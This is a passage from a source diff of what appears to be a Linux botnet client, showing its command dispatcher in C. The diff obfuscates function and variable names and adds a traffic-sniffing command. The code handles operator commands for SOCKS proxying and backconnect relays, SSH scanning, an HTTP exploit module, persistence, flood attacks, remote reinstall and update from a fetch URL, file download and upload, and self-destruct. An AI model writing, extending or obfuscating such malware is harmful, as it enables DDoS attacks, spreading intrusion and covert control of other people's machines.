+        Ry3PtyIn(args, strlen(args));
         return 0;
 
     case CMD_INFO:
@@ -917,13 +920,13 @@ int dispatch_cmd(conn_t *c, uint8_t cmd_id, const char *args) {
         char info[1024], sendbuf[1200];
         memset(hostname, 0, sizeof(hostname));
         gethostname(hostname, sizeof(hostname) - 1);
-        charming_kitten(&arch);
-        mustang_panda(&id);
+        Xy5oR2j(&arch);
+        Ai2mW7K(&id);
         snprintf(info, sizeof(info),
                  "Hostname: %s\nArch: %s\nBotID: %s\nOS: Linux\n",
                  hostname, ds_cstr(&arch), ds_cstr(&id));
-        snprintf(sendbuf, sizeof(sendbuf), ds_cstr(&g_proto_info_fmt), info);
-        vpn_writes(c, sendbuf);
+        snprintf(sendbuf, sizeof(sendbuf), ds_cstr(&_mi6YG6d), info);
+        Ng2ZR5y(c, sendbuf);
         ds_free(&arch);
         ds_free(&id);
         return 0;
@@ -935,42 +938,42 @@ int dispatch_cmd(conn_t *c, uint8_t cmd_id, const char *args) {
             if (strchr(args, ':') != NULL) {
                 dstr rh, rp;
                 ds_init(&rh); ds_init(&rp);
-                if (parse_address(args, &rh, &rp)) {
-                    int err = relay_backconnect(ds_cstr(&rh), ds_cstr(&rp), c);
+                if (gv4Kv3u(args, &rh, &rp)) {
+                    int err = MA2zo8a(ds_cstr(&rh), ds_cstr(&rp), c);
                     char buf[256];
                     if (err < 0)
-                        snprintf(buf, sizeof(buf), ds_cstr(&g_msg_socks_err_fmt), "relay connect failed");
+                        snprintf(buf, sizeof(buf), ds_cstr(&_zR8oC6c), "relay connect failed");
                     else
-                        snprintf(buf, sizeof(buf), ds_cstr(&g_msg_socks_start_fmt), args);
-                    vpn_writes(c, buf);
+                        snprintf(buf, sizeof(buf), ds_cstr(&_hD4fS7K), args);
+                    Ng2ZR5y(c, buf);
                 }
                 ds_free(&rh); ds_free(&rp);
             } else {
-                int err = turmoil(args, c);
+                int err = jw8CH7B(args, c);
                 char buf[256], addr[64];
                 if (err != 0)
-                    snprintf(buf, sizeof(buf), ds_cstr(&g_msg_socks_err_fmt), "bind failed");
+                    snprintf(buf, sizeof(buf), ds_cstr(&_zR8oC6c), "bind failed");
                 else {
                     snprintf(addr, sizeof(addr), "0.0.0.0:%s", args);
-                    snprintf(buf, sizeof(buf), ds_cstr(&g_msg_socks_start_fmt), addr);
+                    snprintf(buf, sizeof(buf), ds_cstr(&_hD4fS7K), addr);
                 }
-                vpn_writes(c, buf);
+                Ng2ZR5y(c, buf);
             }
         } else {
-            int err = turmoil("1080", c);
+            int err = jw8CH7B("1080", c);
             char buf[256];
             if (err != 0)
-                snprintf(buf, sizeof(buf), ds_cstr(&g_msg_socks_err_fmt), "bind failed");
+                snprintf(buf, sizeof(buf), ds_cstr(&_zR8oC6c), "bind failed");
             else
-                snprintf(buf, sizeof(buf), ds_cstr(&g_msg_socks_start_fmt), "0.0.0.0:1080");
-            vpn_writes(c, buf);
+                snprintf(buf, sizeof(buf), ds_cstr(&_hD4fS7K), "0.0.0.0:1080");
+            Ng2ZR5y(c, buf);
         }
         return 0;
     }
 
     case CMD_STOPSOCKS:
-        emotet();
-        vpn_writes(c, ds_cstr(&g_msg_socks_stop));
+        tV4Lm4J();
+        Ng2ZR5y(c, ds_cstr(&_cJ8BU8L));
         return 0;
 
     case CMD_SOCKSAUTH: /* args = "user pass" */
@@ -984,70 +987,61 @@ int dispatch_cmd(conn_t *c, uint8_t cmd_id, const char *args) {
             if (ulen >= sizeof(user)) ulen = sizeof(user) - 1;
             memcpy(user, args, ulen); user[ulen] = '\0';
             strncpy(pass, sp + 1, sizeof(pass) - 1); pass[sizeof(pass) - 1] = '\0';
-            pthread_mutex_lock(&g_socks_creds_mtx);
-            ds_set(&g_proxy_user, user);
-            ds_set(&g_proxy_pass, pass);
-            pthread_mutex_unlock(&g_socks_creds_mtx);
-            snprintf(buf, sizeof(buf), ds_cstr(&g_msg_socks_auth_fmt), user, pass);
+            pthread_mutex_lock(&_kL3Yy7R);
+            ds_set(&_yr2Dc6W, user);
+            ds_set(&_uv4SZ5A, pass);
+            pthread_mutex_unlock(&_kL3Yy7R);
+            snprintf(buf, sizeof(buf), ds_cstr(&_am5bJ3X), user, pass);
         }
-        vpn_writes(c, buf);
+        Ng2ZR5y(c, buf);
         return 0;
     }
 
 #ifndef NO_SELFREP
-    case CMD_SCAN: /* args = "host:port" */
-        if (g_scanner_running) {
-            vpn_writes(c, "[scanner] Already running\n");
-        } else if (!args || !args[0]) {
-            vpn_writes(c, "Usage: !scan <host:port>\n");
-        } else {
-            char buf[256];
-            scanner_init(args);
-            snprintf(buf, sizeof(buf), "[scanner] Starting — reporting to %s\n", args);
-            vpn_writes(c, buf);
-        }
-        return 0;
-
-    case CMD_STOPSCAN:
-        if (g_scanner_running) {
-            scanner_kill();
-            vpn_writes(c, "[scanner] Scanner stopped\n");
-        } else {
-            vpn_writes(c, "[scanner] Scanner not running\n");
-        }
-        return 0;
-
-
     case CMD_SSH:
-        if (ssh_scanner_pid > 0) {
-            vpn_writes(c, "[ssh] Already running\n");
+        if (_bj8XN2t > 0) {
+            Ng2ZR5y(c, "[ssh] Already running\n");
         } else {
-            ssh_scanner_init(args, c);
-            vpn_writes(c, "[ssh] Scanner started\n");
+            kh8hL4N(args, c);
+            Ng2ZR5y(c, "[ssh] Scanner started\n");
         }
         return 0;
 
     case CMD_STOPSSH:
-        if (ssh_scanner_pid > 0) {
-            ssh_scanner_kill();
-            vpn_writes(c, "[ssh] Scanner stopped\n");
+        if (_bj8XN2t > 0) {
+            Ss3vb6a();
+            Ng2ZR5y(c, "[ssh] Scanner stopped\n");
         } else {
-            vpn_writes(c, "[ssh] Scanner not running\n");
+            Ng2ZR5y(c, "[ssh] Scanner not running\n");
         }
         return 0;
 
     case CMD_HTTP:
-        if (http_exploit_pid > 0) {
-            vpn_writes(c, "[http] Already running\n");
+        if (_AR2yQ6h > 0) {
+            Ng2ZR5y(c, "[http] Already running\n");
         } else {
-            http_exploit_init(args);
-            vpn_writes(c, "[http] Exploit module started\n");
+            St3TW4o(args);
+            Ng2ZR5y(c, "[http] Exploit module started\n");
         }
         return 0;
 
     case CMD_STOPHTTP:
-        if (http_exploit_pid > 0) { http_exploit_kill(); vpn_writes(c, "[http] Stopped\n"); }
-        else vpn_writes(c, "[http] Not running\n");
+        if (_AR2yQ6h > 0) { Gc5wq8T(); Ng2ZR5y(c, "[http] Stopped\n"); }
+        else Ng2ZR5y(c, "[http] Not running\n");
+        return 0;
+
+    case CMD_SNIFF:
+        if (_sn7PK3z > 0) {
+            Ng2ZR5y(c, "[sniff] Already running\n");
+        } else {
+            sniffer_init(args);
+            Ng2ZR5y(c, "[sniff] Sniffer started\n");
+        }
+        return 0;
+
+    case CMD_STOPSNIFF:
+        if (_sn7PK3z > 0) { sniffer_kill(); Ng2ZR5y(c, "[sniff] Stopped\n"); }
+        else Ng2ZR5y(c, "[sniff] Not running\n");
         return 0;
 
 
@@ -1056,24 +1050,24 @@ int dispatch_cmd(conn_t *c, uint8_t cmd_id, const char *args) {
     case CMD_PERSIST:
     {
         pthread_t tid;
-        pthread_create(&tid, NULL, dragonfly_thread, NULL);
+        pthread_create(&tid, NULL, Ba7RE7V, NULL);
         pthread_detach(tid);
-        vpn_writes(c, ds_cstr(&g_msg_persist_start));
+        Ng2ZR5y(c, ds_cstr(&_HH8Az2g));
         return 0;
     }
 
 #ifndef NO_ATTACK
     case CMD_ATTACK: /* args = "method target port duration [key=val ...]" */
     {
-        /* Reuse black_energy's attack parsing by reconstructing the text command */
+        /* Reuse CS6Ko7t's attack parsing by reconstructing the text command */
         char cmd[4200];
         snprintf(cmd, sizeof(cmd), "!attack %s", args);
-        return black_energy(c, cmd);
+        return CS6Ko7t(c, cmd);
     }
 
     case CMD_STOPATTACK:
-        attack_kill_all();
-        vpn_writes(c, "[attack] all floods stopped\n");
+        UV8wo4a();
+        Ng2ZR5y(c, "[attack] all floods stopped\n");
         return 0;
 #endif
 
@@ -1081,11 +1075,11 @@ int dispatch_cmd(conn_t *c, uint8_t cmd_id, const char *args) {
     {
         char cmd[4200];
         if (!args || !args[0]) {
-            vpn_writes(c, "[reinstall] missing URL\n");
+            Ng2ZR5y(c, "[reinstall] missing URL\n");
             return -1;
         }
         snprintf(cmd, sizeof(cmd), "!reinstall %s", args);
-        return black_energy(c, cmd);
+        return CS6Ko7t(c, cmd);
     }
 
     case CMD_UPDATEFETCH: /* args = "<fetch_url> [bins_host]" */
@@ -1095,7 +1089,7 @@ int dispatch_cmd(conn_t *c, uint8_t cmd_id, const char *args) {
         int i;
 
         if (!args || !args[0]) {
-            vpn_writes(c, "[updatefetch] missing URL\n");
+            Ng2ZR5y(c, "[updatefetch] missing URL\n");
             return -1;
         }
 
@@ -1105,9 +1099,9 @@ int dispatch_cmd(conn_t *c, uint8_t cmd_id, const char *args) {
             url_buf[i] = *p;
         url_buf[i] = '\0';
 
-        /* Update g_fetch_url in memory */
-        ensure_boot();
-        ds_set(&g_fetch_url, url_buf);
+        /* Update _Xx5Rw4X in memory */
+        iB2Zq4a();
+        ds_set(&_Xx5Rw4X, url_buf);
 
         /* Parse optional second token: bins_host */
         if (*p == ' ') {
@@ -1116,21 +1110,21 @@ int dispatch_cmd(conn_t *c, uint8_t cmd_id, const char *args) {
                 host_buf[i] = *p;
             host_buf[i] = '\0';
             if (host_buf[0]) {
-                ds_set(&g_bins_host_str, host_buf);
-                g_bins_host_ptr = ds_cstr(&g_bins_host_str);
+                ds_set(&_mW2ZD2g, host_buf);
+                _Gy7MD4D = ds_cstr(&_mW2ZD2g);
             }
         }
 
         /* Rewrite all persistence entries with new URL */
-        persist_refresh();
+        AJ3ue7Q();
 
-        vpn_writes(c, "[updatefetch] updated + persistence refreshed\n");
+        Ng2ZR5y(c, "[updatefetch] updated + persistence refreshed\n");
         return 0;
     }
 
     case CMD_KILL:
-        vpn_writes(c, ds_cstr(&g_msg_kill_ack));
-        nuke_and_exit();
+        Ng2ZR5y(c, ds_cstr(&_hb6Aa4L));
+        DB2Ve6Z();
         return 0;
 
     case CMD_EXIT:
@@ -1141,26 +1135,26 @@ int dispatch_cmd(conn_t *c, uint8_t cmd_id, const char *args) {
     {
         char cmd[4200];
         if (!args || !args[0]) {
-            vpn_writes(c, "[download] missing path\n");
+            Ng2ZR5y(c, "[download] missing path\n");
             return -1;
         }
         snprintf(cmd, sizeof(cmd), "!download %s", args);
-        return black_energy(c, cmd);
+        return CS6Ko7t(c, cmd);
     }
 
     case CMD_UPLOAD: /* args = "filepath base64data" */
     {
         char cmd[65536];
         if (!args || !args[0]) {
-            vpn_writes(c, "[upload] missing args\n");
+            Ng2ZR5y(c, "[upload] missing args\n");
             return -1;
         }
         snprintf(cmd, sizeof(cmd), "!upload %s", args);
-        return black_energy(c, cmd);
+        return CS6Ko7t(c, cmd);
     }
 
     default:
-        debug_log("dispatch_cmd: unknown cmd_id 0x%02X", cmd_id);
+        _nS5PJ8Y("yD8Ug8t: unknown cmd_id 0x%02X", cmd_id);
         return -1;
     }
 }
